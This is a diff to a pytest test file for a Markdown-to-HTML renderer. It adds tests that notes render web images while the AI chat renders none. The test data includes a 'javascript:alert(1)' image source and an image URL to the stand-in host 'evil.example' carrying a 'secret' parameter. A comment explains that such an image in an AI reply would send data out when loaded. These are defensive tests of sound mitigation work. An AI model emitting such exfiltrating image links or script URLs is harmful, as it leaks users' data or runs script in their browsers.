@@ -1,6 +1,6 @@
 import pytest
 
-from app.services.markdown_rendering import render_markdown_to_html
+from app.services.markdown_rendering import render_markdown_to_html, render_note_markdown_to_html
 
 
 def test_ordered_list_continues_across_blank_lines_between_items() -> None:
@@ -209,3 +209,31 @@ def test_escaped_trailing_pipe_stays_in_the_last_cell() -> None:
 ])
 def test_an_indented_item_nests_inside_the_item_above(markdown: str, expected: str) -> None:
     assert render_markdown_to_html(markdown) == expected
+
+
+# Images (2026-10-31): drawn in notes from web addresses only; the AI chat and footnotes
+# (render_markdown_to_html) draw none.
+@pytest.mark.parametrize(("markdown", "expected"), [
+    ("![a cat](https://example.com/cat.png)", '<p><img src="https://example.com/cat.png" alt="a cat" loading="lazy"></p>'),
+    ("Look ![c](http://e.com/c.png) here", '<p>Look <img src="http://e.com/c.png" alt="c" loading="lazy"> here</p>'),
+    ("- item ![c](https://e.com/c.png)", '<ul><li>item <img src="https://e.com/c.png" alt="c" loading="lazy"></li></ul>'),
+    (
+        '![a "q" & b](https://e.com/a.png?x=1&y=2)',
+        '<p><img src="https://e.com/a.png?x=1&amp;y=2" alt="a &quot;q&quot; &amp; b" loading="lazy"></p>',
+    ),
+    # No web address: no image to load, so the text stays as written.
+    ("![x](photo.png)", "<p>![x](photo.png)</p>"),
+    ("![x](javascript:alert(1))", "<p>![x](javascript:alert(1))</p>"),
+    ("![x](data:image/png;base64,AAAA)", "<p>![x](data:image/png;base64,AAAA)</p>"),
+    # A link, and a ! before other text, are unchanged.
+    ("Wow! [link](https://e.com)", '<p>Wow! <a href="https://e.com" target="_blank" rel="noopener noreferrer">link</a></p>'),
+])
+def test_a_note_draws_web_images(markdown: str, expected: str) -> None:
+    assert render_note_markdown_to_html(markdown) == expected
+
+
+def test_the_ai_chat_draws_no_images() -> None:
+    # An image address in a reply would send data out when the browser loads it.
+    rendered = render_markdown_to_html("![x](https://evil.example/collect?secret=1)")
+    assert "<img" not in rendered
+    assert render_note_markdown_to_html("> quoted ![x](https://e.com/x.png)").count("<img") == 1
